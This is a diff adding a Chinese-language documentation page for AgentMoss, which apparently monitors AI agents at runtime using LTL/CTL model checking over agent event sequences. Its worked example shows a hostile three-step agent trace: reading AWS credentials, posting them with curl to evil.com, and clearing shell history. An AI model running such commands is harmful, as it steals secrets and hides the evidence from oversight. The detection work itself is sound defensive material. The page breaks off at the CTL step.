@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>形式化验证Agent运行时全局性质 — AgentMoss</title>
+  <meta name="description" content="AgentMoss L2.2 模型检测，基于 LTL+CTL 形式化验证 Agent 运行时安全属性。">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌿</text></svg>">
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar">
+  <div class="navbar-container">
+    <a href="index.html" class="navbar-logo"><span class="moss-icon">🌿</span> AgentMoss</a>
+    <button class="navbar-mobile-toggle">☰</button>
+    <ul class="navbar-menu">
+      <li><a href="architecture.html">架构</a></li>
+      <li><a href="detection.html" class="active">检测方法</a></li>
+      <li><a href="rules.html">规则集</a></li>
+      <li><a href="usage.html">使用指南</a></li>
+      <li><a href="aarm.html">AARM</a></li>
+      <li><a href="https://github.com/Agent-Moss" target="_blank">GitHub</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- Detail Page -->
+<div class="detail-page">
+  <div class="detail-layout">
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <a href="detection.html" class="sidebar-back">← 检测方法</a>
+      <div class="sidebar-title">本页索引</div>
+      <ul class="sidebar-nav">
+        <li><a href="#background" class="sidebar-item active">背景与动机</a></li>
+        <li><a href="#kripke" class="sidebar-item">Kripke 结构构建</a></li>
+        <li><a href="#propositions" class="sidebar-item">17 种原子命题</a></li>
+        <li><a href="#labeling" class="sidebar-item">标记函数</a></li>
+        <li><a href="#ltl" class="sidebar-item">LTL 时序逻辑</a></li>
+        <li><a href="#ctl" class="sidebar-item">CTL 分支逻辑</a></li>
+        <li><a href="#ltl-rules" class="sidebar-item">LTL 攻击模式规则</a></li>
+        <li><a href="#ctl-rules" class="sidebar-item">CTL 安全属性规则</a></li>
+        <li><a href="#algorithm" class="sidebar-item">模型检测算法</a></li>
+        <li><a href="#integration" class="sidebar-item">集成架构</a></li>
+        <li><a href="#example" class="sidebar-item">运行示例</a></li>
+        <li><a href="#limitations" class="sidebar-item">局限性与未来</a></li>
+      </ul>
+      <div class="sidebar-divider"></div>
+      <div class="sidebar-title">其他检测方法</div>
+      <ul class="sidebar-nav">
+        <li><a href="detection-l1.html" class="sidebar-item">L1 单点行为规则</a></li>
+        <li><a href="detection-l2-1.html" class="sidebar-item">L2.1 PDG 混合机制</a></li>
+      </ul>
+    </aside>
+
+    <!-- Content -->
+    <main class="detail-content">
+
+      <!-- Title + Paper Citation -->
+      <section class="detail-section" id="background">
+        <div class="detail-section-tag"><span class="layer-badge" style="background: rgba(99,102,241,0.12); color: #6366f1;">L2.2</span> 模型检测 · 时序规则</div>
+        <h2 class="detail-section-title">形式化验证Agent运行时全局性质</h2>
+        <p class="detail-section-desc">将 Agent 事件序列建模为 Kripke 结构，使用 LTL（线性时序逻辑）检测攻击模式，使用 CTL（计算树逻辑）验证分支安全属性。15 条预定义时序规则，17 种原子命题，自动验证行为序列合规性。</p>
+
+        <!-- Paper Citation Button -->
+        <div class="paper-citation">
+          <div class="paper-citation-icon">📄</div>
+          <div class="paper-citation-body">
+            <h4>AgentVerify: Compositional Formal Verification of AI Agent Safety Properties via LTL Model Checking</h4>
+            <div class="paper-authors">Eric Fang</div>
+            <div class="paper-venue">Preprints.org · 2026 · Manuscript 202604.1029</div>
+            <p class="paper-abstract">本文提出 AgentVerify——一个基于时序逻辑的模型检查框架，为智能体架构定义组合式安全规范（内存完整性、工具调用协议、MCP/技能调用、人在回路边界）。在 15 个智能体场景的评估中，AgentVerify 事后行为分析达到 86.67% 验证准确率，显著优于单体合约验证（80%）、无时序逻辑运行时监控（46.67%）和单体神经验证器（13.33%）。</p>
+            <a href="https://www.preprints.org/manuscript/202604.1029" target="_blank" class="btn-paper">📄 阅读论文全文 →</a>
+          </div>
+        </div>
+
+        <h3>为什么需要模型检测</h3>
+        <p>AgentMoss 现有检测体系中，L1 单点行为规则（91 条）基于正则模式匹配，零时延但无法理解跨步骤时序关系；L2.1 基于PDG（24 条）通过数据流追踪和行为链匹配检测跨步骤攻击，但行为链是硬编码的 phase 序列，无法表达复杂时序约束。</p>
+
+        <p style="margin-top: 16px;">L2.1 行为链的局限：</p>
+        <ul style="margin-left: 20px; margin-top: 8px; color: var(--text-secondary);">
+          <li>只能匹配固定顺序的 phase（A→B→C），无法表达 "A 发生后 B 在未来某个时刻发生" 这类弹性时序</li>
+          <li>无法表达分支性质（"在所有可能的执行路径上，A 都不应导致 B"）</li>
+          <li>无法表达安全不变量（"日志清除操作在任何情况下都不应发生"）</li>
+          <li>无法表达活性属性（"Prompt 注入检测到后，必须在后续步骤中被阻断"）</li>
+        </ul>
+
+        <div class="table-wrapper" style="margin-top: 20px;">
+          <table>
+            <thead><tr><th>特性</th><th>L2.1 行为链/PDG</th><th>L2.2 模型检测</th></tr></thead>
+            <tbody>
+              <tr><td>时序约束</td><td>固定序列</td><td>弹性时序 (G/F/X/U)</td></tr>
+              <tr><td>分支分析</td><td>❌</td><td>✅ CTL (A/E + 路径量词)</td></tr>
+              <tr><td>安全不变量</td><td>❌</td><td>✅ AG(¬φ)</td></tr>
+              <tr><td>活性属性</td><td>❌</td><td>✅ AF(φ) / G(φ→F(ψ))</td></tr>
+              <tr><td>嵌套时序</td><td>❌</td><td>✅ F(A & F(B))</td></tr>
+              <tr><td>可扩展性</td><td>新增链需改代码</td><td>新增规则只需写公式</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout" style="margin-top: 20px;">
+          <div class="callout-title">理论基础</div>
+          <p><strong>LTL (Linear Temporal Logic)</strong>: 描述线性执行路径上的时序性质，适合检测顺序攻击模式。<strong>CTL (Computation Tree Logic)</strong>: 描述分支执行树上的时序性质，适合检测安全不变量和跨路径属性。<strong>Kripke Structure (克里普克结构)</strong>: 将 Agent 事件序列转化为状态机模型，作为模型检测的输入。</p>
+        </div>
+      </section>
+
+      <!-- Kripke Structure -->
+      <section class="detail-section" id="kripke">
+        <div class="detail-section-tag">状态建模</div>
+        <h2 class="detail-section-title">Kripke 结构构建</h2>
+        <p class="detail-section-desc">将 Agent 运行时事件序列转化为 Kripke 结构 K = (S, S₀, R, L)，作为模型检测的形式化输入。</p>
+
+        <div class="code-block">K = (S, S₀, R, L)
+  <span class="comment">// S: 状态集合 — 每个 Agent 事件对应一个状态</span>
+  <span class="comment">// S₀: 初始状态 — 时间最早的事件</span>
+  <span class="comment">// R: 转移关系 — R(s, s') 表示从状态 s 可到达状态 s'</span>
+  <span class="comment">// L: 标记函数 — L(s) 返回状态 s 上成立的原子命题集合</span></div>
+
+        <h3>线性状态构建</h3>
+        <div class="code-block"><span class="comment">// Agent 事件序列 (按时间排序):</span>
+<span class="comment">//   e₁ → e₂ → e₃ → ... → eₙ</span>
+
+<span class="comment">// Kripke 结构:</span>
+S = { s₁, s₂, ..., sₙ }  <span class="comment">// 每个 eᵢ 对应一个 sᵢ</span>
+S₀ = { s₁ }
+R = { (sᵢ, sᵢ₊₁) | 1 ≤ i &lt; n }  <span class="comment">// 线性序列</span>
+L(sᵢ) = labelEvent(eᵢ)  <span class="comment">// 原子命题集合</span></div>
+
+        <h3>分支结构 (CTL)</h3>
+        <p>当事件有 <code>parentEventIds</code> 时，构建分支树，CTL 可分析 "在所有路径上" (A) 或 "存在某条路径" (E) 的性质：</p>
+        <div class="code-block">        e₁ (root)
+       / \
+      e₂  e₃
+      |   |
+      e₄  e₅
+
+<span class="comment">// R(s₁, s₂), R(s₁, s₃) — 两个子分支</span></div>
+      </section>
+
+      <!-- Atomic Propositions -->
+      <section class="detail-section" id="propositions">
+        <div class="detail-section-tag">原子命题</div>
+        <h2 class="detail-section-title">17 种原子命题</h2>
+        <p class="detail-section-desc">每个状态通过标记函数分配一组原子命题 (Atomic Propositions)，作为 LTL/CTL 公式的基本构件。</p>
+
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>AP</th><th>含义</th><th>检测来源</th></tr></thead>
+            <tbody>
+              <tr><td><code>reads_credential</code></td><td>读取凭证文件</td><td>SENSITIVE_READ 正则 + sensitiveKinds</td></tr>
+              <tr><td><code>network_egress</code></td><td>网络外传</td><td>EGRESS 正则 + tool actionClass=egress</td></tr>
+              <tr><td><code>execute_file</code></td><td>执行文件/脚本</td><td>EXECUTE 正则 + tool actionClass=compute</td></tr>
+              <tr><td><code>write_file</code></td><td>写入文件系统</td><td>write 操作检测</td></tr>
+              <tr><td><code>delete_file</code></td><td>删除文件</td><td>rm/unlink 正则</td></tr>
+              <tr><td><code>disable_security</code></td><td>禁用安全工具</td><td>DISABLE_SECURITY 正则</td></tr>
+              <tr><td><code>install_persistence</code></td><td>安装持久化机制</td><td>PERSIST 正则</td></tr>
+              <tr><td><code>privilege_escalation</code></td><td>提权操作</td><td>PRIVILEGE 正则</td></tr>
+              <tr><td><code>download_file</code></td><td>下载文件</td><td>DOWNLOAD 正则</td></tr>
+              <tr><td><code>archive_data</code></td><td>归档/压缩数据</td><td>ARCHIVE 正则</td></tr>
+              <tr><td><code>prompt_injection</code></td><td>Prompt 注入</td><td>hasPromptInjection / hasToolResultInjection</td></tr>
+              <tr><td><code>sensitive_data</code></td><td>接触敏感数据</td><td>detectSensitiveKinds 非空</td></tr>
+              <tr><td><code>lateral_movement</code></td><td>横向移动</td><td>SSH/scp/rsync 正则</td></tr>
+              <tr><td><code>clear_logs</code></td><td>清除日志</td><td>history/log 清除正则</td></tr>
+              <tr><td><code>blocked_by_policy</code></td><td>被策略阻断</td><td>payload.policyAction=block</td></tr>
+              <tr><td><code>approved_by_policy</code></td><td>需要审批</td><td>payload.policyAction=approval</td></tr>
+              <tr><td><code>allowed_by_policy</code></td><td>被策略放行</td><td>payload.policyAction=allow</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Labeling Function -->
+      <section class="detail-section" id="labeling">
+        <div class="detail-section-tag">标记函数</div>
+        <h2 class="detail-section-title">标记函数 labelEvent()</h2>
+        <p class="detail-section-desc">标记函数 <code>labelEvent(event: AgentMossEvent): Set&lt;string&gt;</code> 复用现有检测能力，为每个状态分配原子命题集合。</p>
+
+        <div class="code-block"><span class="comment">// 输入: AgentMossEvent</span>
+<span class="comment">//   │</span>
+<span class="comment">//   ├── 提取文本内容 (toolName + params + hookName)</span>
+<span class="comment">//   │</span>
+<span class="comment">//   ├── 复用 behavior-chain.ts 的正则模式</span>
+<span class="comment">//   │   ├── DOWNLOAD_PATTERNS → download_file</span>
+<span class="comment">//   │   ├── EXECUTE_PATTERNS → execute_file</span>
+<span class="comment">//   │   ├── PERSIST_PATTERNS → install_persistence</span>
+<span class="comment">//   │   ├── PRIVILEGE_PATTERNS → privilege_escalation</span>
+<span class="comment">//   │   ├── EGRESS_PATTERNS → network_egress</span>
+<span class="comment">//   │   ├── SENSITIVE_READ_PATTERNS → reads_credential</span>
+<span class="comment">//   │   ├── DISABLE_SECURITY_PATTERNS → disable_security</span>
+<span class="comment">//   │   └── ARCHIVE_PATTERNS → archive_data</span>
+<span class="comment">//   │</span>
+<span class="comment">//   ├── 复用 pdg.ts 的内容分析</span>
+<span class="comment">//   │   ├── detectSensitiveKinds() → sensitive_data</span>
+<span class="comment">//   │   ├── hasPromptInjection() → prompt_injection</span>
+<span class="comment">//   │   └── hasToolResultInjection() → prompt_injection</span>
+<span class="comment">//   │</span>
+<span class="comment">//   ├── 复用 registry.ts 的工具属性</span>
+<span class="comment">//   │   ├── actionClass=network_egress → network_egress</span>
+<span class="comment">//   │   ├── actionClass=compute → execute_file</span>
+<span class="comment">//   │   └── actionClass=write → write_file</span>
+<span class="comment">//   │</span>
+<span class="comment">//   └── 检查 payload.policyAction</span>
+<span class="comment">//       ├── "block" → blocked_by_policy</span>
+<span class="comment">//       ├── "approval" → approved_by_policy</span>
+<span class="comment">//       └── "allow" → allowed_by_policy</span>
+<span class="comment">//</span>
+<span class="comment">// 输出: Set<string> (原子命题集合)</span></div>
+
+        <div class="callout">
+          <div class="callout-title">标签复用设计</div>
+          <p>标记函数不重新实现检测逻辑，而是复用 L1 的正则模式和 PDG 的内容分析函数，确保三层检测体系的标签一致性。</p>
+        </div>
+      </section>
+
+      <!-- LTL Syntax -->
+      <section class="detail-section" id="ltl">
+        <div class="detail-section-tag">LTL</div>
+        <h2 class="detail-section-title">LTL 线性时序逻辑</h2>
+        <p class="detail-section-desc">LTL 描述线性执行路径上的时序性质，适合检测顺序攻击模式。公式满足 = 攻击存在。</p>
+
+        <h3>语法</h3>
+        <div class="code-block">φ ::= p              <span class="comment">(原子命题)</span>
+    | !φ              <span class="comment">(否定)</span>
+    | φ & ψ           <span class="comment">(合取)</span>
+    | φ | ψ           <span class="comment">(析取)</span>
+    | φ -> ψ          <span class="comment">(蕴含)</span>
+    | X(φ)            <span class="comment">(下一时刻)</span>
+    | G(φ)            <span class="comment">(所有未来时刻)</span>
+    | F(φ)            <span class="comment">(存在未来时刻)</span>
+    | φ U ψ           <span class="comment">(直到)</span></div>
+
+        <h3>有限迹语义</h3>
+        <p>AgentMoss 处理有限迹（已发生的事件序列），采用有限迹语义：</p>
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>算子</th><th>位置 i 处的语义</th></tr></thead>
+            <tbody>
+              <tr><td><code>p</code></td><td>p ∈ L(sᵢ)</td></tr>
+              <tr><td><code>!φ</code></td><td>φ 在 i 处不成立</td></tr>
+              <tr><td><code>φ & ψ</code></td><td>φ 和 ψ 都在 i 处成立</td></tr>
+              <tr><td><code>φ | ψ</code></td><td>φ 或 ψ 在 i 处成立</td></tr>
+              <tr><td><code>φ -> ψ</code></td><td>!φ 或 ψ 在 i 处成立</td></tr>
+              <tr><td><code>X(φ)</code></td><td>i+1 存在且 φ 在 i+1 处成立</td></tr>
+              <tr><td><code>G(φ)</code></td><td>对所有 j ∈ [i, n], φ 在 j 处成立</td></tr>
+              <tr><td><code>F(φ)</code></td><td>存在 j ∈ [i, n], φ 在 j 处成立</td></tr>
+              <tr><td><code>φ U ψ</code></td><td>存在 j ∈ [i, n], ψ 在 j 处成立, 且对所有 k ∈ [i, j), φ 在 k 处成立</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- CTL Syntax -->
+      <section class="detail-section" id="ctl">
+        <div class="detail-section-tag">CTL</div>
+        <h2 class="detail-section-title">CTL 计算树逻辑</h2>
+        <p class="detail-section-desc">CTL 描述分支执行树上的时序性质，适合检测安全不变量和跨路径属性。属性违反 = 攻击存在。</p>
+
+        <h3>语法</h3>
+        <div class="code-block">φ ::= p              <span class="comment">(原子命题)</span>
+    | !φ              <span class="comment">(否定)</span>
+    | φ & ψ           <span class="comment">(合取)</span>
+    | φ | ψ           <span class="comment">(析取)</span>
+    | φ -> ψ          <span class="comment">(蕴含)</span>
+    | EX(φ)           <span class="comment">(存在下一状态满足φ)</span>
+    | AX(φ)           <span class="comment">(所有下一状态满足φ)</span>
+    | EG(φ)           <span class="comment">(存在路径全局满足φ)</span>
+    | AG(φ)           <span class="comment">(所有路径全局满足φ)</span>
+    | EF(φ)           <span class="comment">(存在路径最终满足φ)</span>
+    | AF(φ)           <span class="comment">(所有路径最终满足φ)</span>
+    | E[φ U ψ]        <span class="comment">(存在路径φ直到ψ)</span>
+    | A[φ U ψ]        <span class="comment">(所有路径φ直到ψ)</span></div>
+
+        <h3>自底向上标记算法</h3>
+        <p>对于公式 φ, 计算满足 φ 的状态集合 Sat(φ)：</p>
+        <div class="code-block"><span class="comment">// 基本情况</span>
+1. p (原子):     Sat(p) = { s | p ∈ L(s) }
+2. !φ:           Sat(!φ) = S \ Sat(φ)
+3. φ & ψ:        Sat(φ & ψ) = Sat(φ) ∩ Sat(ψ)
+
+<span class="comment">// 时序算子</span>
+4. EX(φ):        Sat(EX(φ)) = { s | ∃s'. R(s,s') ∧ s' ∈ Sat(φ) }
+5. AX(φ):        Sat(AX(φ)) = { s | ∀s'. R(s,s') → s' ∈ Sat(φ) }
+6. EG(φ):        <span class="comment">// 最大不动点迭代</span>
+7. AG(φ):        Sat(AG(φ)) = Sat(¬EF(¬φ))
+8. EF(φ):        <span class="comment">// 最小不动点: Sat(φ) ∪ { s | ∃s'. R(s,s') ∧ s' ∈ Sat(EF(φ)) }</span>
+9. AF(φ):        Sat(AF(φ)) = Sat(¬EG(¬φ))
+10. E[φ U ψ]:    <span class="comment">// 最小不动点</span>
+11. A[φ U ψ]:    Sat(A[φ U ψ]) = Sat(¬E[¬ψ U (¬φ & ¬ψ)]) ∩ Sat(¬EG(¬ψ))</div>
+      </section>
+
+      <!-- LTL Rules -->
+      <section class="detail-section" id="ltl-rules">
+        <div class="detail-section-tag">LTL 规则</div>
+        <h2 class="detail-section-title">LTL 攻击模式检测规则</h2>
+        <p class="detail-section-desc">10 条 LTL 规则检测攻击模式：公式满足 = 攻击存在。每条规则在事件迹的位置 0 处评估。</p>
+
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>ID</th><th>公式</th><th>描述</th><th>动作</th></tr></thead>
+            <tbody>
+              <tr><td>mc-ltl-001</td><td><code>F(reads_credential & F(network_egress))</code></td><td>凭证读取后网络外传</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-002</td><td><code>F(download_file & F(execute_file))</code></td><td>下载后执行</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-003</td><td><code>F(disable_security & F(execute_file | delete_file | privilege_escalation))</code></td><td>禁用安全后破坏性操作</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-004</td><td><code>F(prompt_injection & F(network_egress | write_file | execute_file))</code></td><td>注入后敏感操作</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-005</td><td><code>F(reads_credential & F(lateral_movement))</code></td><td>凭证读取后横向移动</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-006</td><td><code>F(sensitive_data & F(clear_logs))</code></td><td>敏感数据访问后清除日志</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-007</td><td><code>F(privilege_escalation & F(install_persistence))</code></td><td>提权后安装持久化</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-008</td><td><code>F(download_file & F(install_persistence))</code></td><td>下载后安装持久化</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-009</td><td><code>F(sensitive_data & F(archive_data & F(network_egress)))</code></td><td>敏感数据→归档→外传</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ltl-010</td><td><code>F(install_persistence)</code></td><td>持久化机制安装</td><td><span class="badge badge-approval">approval</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- CTL Rules -->
+      <section class="detail-section" id="ctl-rules">
+        <div class="detail-section-tag">CTL 规则</div>
+        <h2 class="detail-section-title">CTL 安全属性验证规则</h2>
+        <p class="detail-section-desc">5 条 CTL 规则验证安全属性：属性违反 = 攻击存在。使用 AG（所有路径全局）和 AF（所有路径最终）验证不变量和活性。</p>
+
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>ID</th><th>属性公式</th><th>违反含义</th><th>动作</th></tr></thead>
+            <tbody>
+              <tr><td>mc-ctl-001</td><td><code>AG(!clear_logs)</code></td><td>安全不变量：日志不应被清除</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ctl-002</td><td><code>AG(prompt_injection -> AF(blocked_by_policy))</code></td><td>活性：注入必须被阻断</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ctl-003</td><td><code>AG(install_persistence -> AF(blocked_by_policy | approved_by_policy))</code></td><td>问责：持久化必须被管控</td><td><span class="badge badge-approval">approval</span></td></tr>
+              <tr><td>mc-ctl-004</td><td><code>AG(disable_security -> AF(blocked_by_policy))</code></td><td>活性：安全禁用必须被阻断</td><td><span class="badge badge-block">block</span></td></tr>
+              <tr><td>mc-ctl-005</td><td><code>AG(privilege_escalation -> AF(blocked_by_policy | approved_by_policy))</code></td><td>问责：提权必须被管控</td><td><span class="badge badge-approval">approval</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Algorithm -->
+      <section class="detail-section" id="algorithm">
+        <div class="detail-section-tag">算法实现</div>
+        <h2 class="detail-section-title">模型检测算法</h2>
+        <p class="detail-section-desc">LTL 使用递归迹检查算法，CTL 使用自底向上标记算法（含不动点迭代）。</p>
+
+        <h3>LTL 迹检查</h3>
+        <div class="code-block"><span class="comment">// 输入: 公式 φ, 事件迹 e₁...eₙ</span>
+<span class="comment">// 输出: 迹是否满足 φ (在位置 0 处)</span>
+
+<span class="function">function</span> evaluateLTL(φ, trace, position):
+  <span class="keyword">switch</span> φ.type:
+    <span class="keyword">case</span> ATOM:  <span class="keyword">return</span> φ.name <span class="keyword">in</span> L(trace[position])
+    <span class="keyword">case</span> NOT:   <span class="keyword">return</span> !evaluateLTL(φ.inner, trace, position)
+    <span class="keyword">case</span> AND:   <span class="keyword">return</span> evaluateLTL(φ.left, trace, position) && evaluateLTL(φ.right, trace, position)
+    <span class="keyword">case</span> OR:    <span class="keyword">return</span> evaluateLTL(φ.left, trace, position) || evaluateLTL(φ.right, trace, position)
+    <span class="keyword">case</span> IMPLIES: <span class="keyword">return</span> !evaluateLTL(φ.left, trace, position) || evaluateLTL(φ.right, trace, position)
+    <span class="keyword">case</span> NEXT:  <span class="keyword">return</span> position+1 &lt; len(trace) && evaluateLTL(φ.inner, trace, position+1)
+    <span class="keyword">case</span> GLOBALLY:
+      <span class="keyword">for</span> j <span class="keyword">from</span> position <span class="keyword">to</span> len(trace)-1:
+        <span class="keyword">if</span> !evaluateLTL(φ.inner, trace, j): <span class="keyword">return</span> <span class="keyword">false</span>
+      <span class="keyword">return</span> <span class="keyword">true</span>
+    <span class="keyword">case</span> EVENTUALLY:
+      <span class="keyword">for</span> j <span class="keyword">from</span> position <span class="keyword">to</span> len(trace)-1:
+        <span class="keyword">if</span> evaluateLTL(φ.inner, trace, j): <span class="keyword">return</span> <span class="keyword">true</span>
+      <span class="keyword">return</span> <span class="keyword">false</span>
+    <span class="keyword">case</span> UNTIL:
+      <span class="keyword">for</span> j <span class="keyword">from</span> position <span class="keyword">to</span> len(trace)-1:
+        <span class="keyword">if</span> evaluateLTL(φ.right, trace, j): <span class="keyword">return</span> <span class="keyword">true</span>
+        <span class="keyword">if</span> !evaluateLTL(φ.left, trace, j): <span class="keyword">return</span> <span class="keyword">false</span>
+      <span class="keyword">return</span> <span class="keyword">false</span></div>
+
+        <h3>CTL 自底向上标记</h3>
+        <div class="code-block"><span class="comment">// 输入: 公式 φ, Kripke 结构 K=(S, S₀, R, L)</span>
+<span class="comment">// 输出: Sat(φ) ⊆ S</span>
+
+<span class="function">function</span> evaluateCTL(φ, K):
+  <span class="keyword">switch</span> φ.type:
+    <span class="keyword">case</span> ATOM:  <span class="keyword">return</span> { s | φ.name <span class="keyword">in</span> L(s) }
+    <span class="keyword">case</span> NOT:   <span class="keyword">return</span> S \ evaluateCTL(φ.inner, K)
+    <span class="keyword">case</span> AND:   <span class="keyword">return</span> evaluateCTL(φ.left, K) ∩ evaluateCTL(φ.right, K)
+    <span class="keyword">case</span> EX:    <span class="keyword">return</span> { s | ∃s'. R(s,s') ∧ s' ∈ evaluateCTL(φ.inner, K) }
+    <span class="keyword">case</span> EF:    <span class="comment">// 最小不动点</span>
+      result = evaluateCTL(φ.inner, K)
+      <span class="keyword">while</span> changed:
+        <span class="keyword">for</span> s <span class="keyword">in</span> S \ result:
+          <span class="keyword">if</span> ∃s'. R(s,s') ∧ s' ∈ result: result.add(s)
+      <span class="keyword">return</span> result
+    <span class="keyword">case</span> EG:    <span class="comment">// 最大不动点</span>
+      result = <span class="keyword">new</span> Set(evaluateCTL(φ.inner, K))
+      <span class="keyword">while</span> changed:
+        <span class="keyword">for</span> s <span class="keyword">in</span> result:
+          <span class="keyword">if</span> s has no successor <span class="keyword">in</span> result: result.delete(s)
+      <span class="keyword">return</span> result
+    <span class="keyword">case</span> AG:    <span class="keyword">return</span> S \ evaluateCTL(EF(NOT(φ.inner)), K)
+    <span class="keyword">case</span> AF:    <span class="keyword">return</span> S \ evaluateCTL(EG(NOT(φ.inner)), K)</div>
+
+        <h3>违规判定</h3>
+        <div class="code-block"><span class="comment">// LTL 规则: 公式满足 = 攻击存在</span>
+violation = evaluateLTL(formula, trace, 0)
+
+<span class="comment">// CTL 规则: 属性违反 = 攻击存在</span>
+satSet = evaluateCTL(formula, K)
+violatingStates = S \ satSet  <span class="comment">// 不满足属性公式 = 违规</span></div>
+      </section>
+
+      <!-- Integration -->
+      <section class="detail-section" id="integration">
+        <div class="detail-section-tag">集成架构</div>
+        <h2 class="detail-section-title">在检测管线中的位置</h2>
+        <p class="detail-section-desc">L2.2 作为最高优先级检测层，先于 L2.1 PDG 和 L1 单点规则执行。</p>
+
+        <div class="code-block">Tool Call 请求
+    │
+    ├─ L1: 单点模式匹配 (rules.ts + hooks.ts)     ── 零时延
+    ├─ L2.1: PDG 数据流 (pdg.ts)                   ── 跨步骤
+    ├─ L2.1: 行为链 (behavior-chain.ts)             ── 序列匹配
+    ├─ L2.2: 模型检测 (model-checker.ts)             ── 时序验证
+    │
+    └─ 决策合并 (L2.2 > L2.1 > L1)</div>
+
+        <h3>运行时检查流程</h3>
+        <div class="code-block"><span class="comment">// 新事件到达</span>
+    ├── 构建/更新 Kripke 结构 (state-machine.ts)
+    │   ├── 提取原子命题 (labelEvent)
+    │   ├── 按时间排序构建状态序列
+    │   └── 构建 parentEventIds 转移关系
+    │
+    ├── LTL 检查
+    │   ├── 遍历所有 LTL 规则
+    │   ├── 在迹的位置 0 处评估公式
+    │   └── 公式满足 → violation (attack detected)
+    │
+    ├── CTL 检查
+    │   ├── 遍历所有 CTL 属性
+    │   ├── 自底向上计算 Sat(φ)
+    │   └── S \ Sat(φ) 非空 → violation (property violated)
+    │
+    └── 仅当当前事件属于 violation witness 时返回 block/approval</div>
+
+        <h3>与现有层的关系</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>关系</th><th>说明</th></tr></thead>
+            <tbody>
+              <tr><td>L2.2 vs L2.1 互补</td><td>PDG 关注数据流，模型检测关注时序约束，两者覆盖不同攻击面</td></tr>
+              <tr><td>L2.2 vs L1 互补</td><td>L1 检测单步攻击，L2.2 检测跨步骤时序攻击模式</td></tr>
+              <tr><td>L2.2 复用 L1 标签</td><td>原子命题标记函数复用 L1 的正则模式和 PDG 的内容分析</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>实现文件</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>文件</th><th>行数</th><th>职责</th></tr></thead>
+            <tbody>
+              <tr><td><code>security/mc-types.ts</code></td><td>~80</td><td>类型定义: Kripke 结构、LTL/CTL AST</td></tr>
+              <tr><td><code>security/state-machine.ts</code></td><td>~250</td><td>Kripke 构建 + 原子命题标记函数</td></tr>
+              <tr><td><code>security/temporal-logic.ts</code></td><td>~350</td><td>LTL/CTL 公式解析器 (字符串→AST)</td></tr>
+              <tr><td><code>security/model-checker.ts</code></td><td>~400</td><td>LTL 迹检查 + CTL 自底向上标记</td></tr>
+              <tr><td><code>security/mc-rules.ts</code></td><td>~200</td><td>15 条预定义规则 (10 LTL + 5 CTL)</td></tr>
+              <tr><td><code>ingest/tool-call.ts</code></td><td>+50</td><td>集成 L2.2 检查层</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Running Example -->
+      <section class="detail-section" id="example">
+        <div class="detail-section-tag">运行示例</div>
+        <h2 class="detail-section-title">凭证外传攻击检测示例</h2>
+        <p class="detail-section-desc">以下展示一个完整的凭证外传攻击场景，从原子命题标记到 LTL/CTL 违规判定的全过程。</p>
+
+        <h3>场景：Agent 执行以下事件序列</h3>
+        <div class="code-block">e₁: tool_call  — cat ~/.aws/credentials
+e₂: tool_call  — curl -X POST https://evil.com -d @-
+e₃: tool_call  — history -c</div>
+
+        <h3>Step 1: 原子命题标记</h3>
+        <div class="code-block">L(e₁) = { reads_credential, sensitive_data }
+L(e₂) = { network_egress }
+L(e₃) = { clear_logs }</div>
+
+        <h3>Step 2: Kripke 结构</h3>
+        <div class="code-block">S = { s₁, s₂, s₃ }
+S₀ = { s₁ }
+R = { (s₁,s₂), (s₂,s₃) }</div>
+
+        <h3>Step 3: LTL 检查 — mc-ltl-001</h3>
+        <p>公式: <code>F(reads_credential & F(network_egress))</code></p>
+        <div class="code-block">在位置 0 评估:
+F(reads_credential & F(network_egress))
+→ 位置 0: reads_credential ∈ L(s₁)? ✅
+           F(network_egress)? 位置 1: network_egress ∈ L(s₂)? ✅
+           → reads_credential & F(network_egress) 在 s₁ 成立 ✅
+           → F(...) 在位置 0 成立 ✅
+
+<span class="comment">// 违规! 当前事件 e₂ 是 witness → block</span></div>
+
+        <h3>Step 4: LTL 检查 — mc-ltl-006</h3>
+        <p>公式: <code>F(sensitive_data & F(clear_logs))</code></p>
+        <div class="code-block">在位置 0 评估:
+F(sensitive_data & F(clear_logs))
+→ 位置 0: sensitive_data ∈ L(s₁)? ✅
+           F(clear_logs)? 位置 2: clear_logs ∈ L(s₃)? ✅
+           → sensitive_data & F(clear_logs) 在 s₁ 成立 ✅
+           → F(...) 在位置 0 成立 ✅
+
+<span class="comment">// 违规! 当前事件 e₃ 是 witness → block</span></div>
+
+        <h3>Step 5: CTL 检查 — mc-ctl-001</h3>
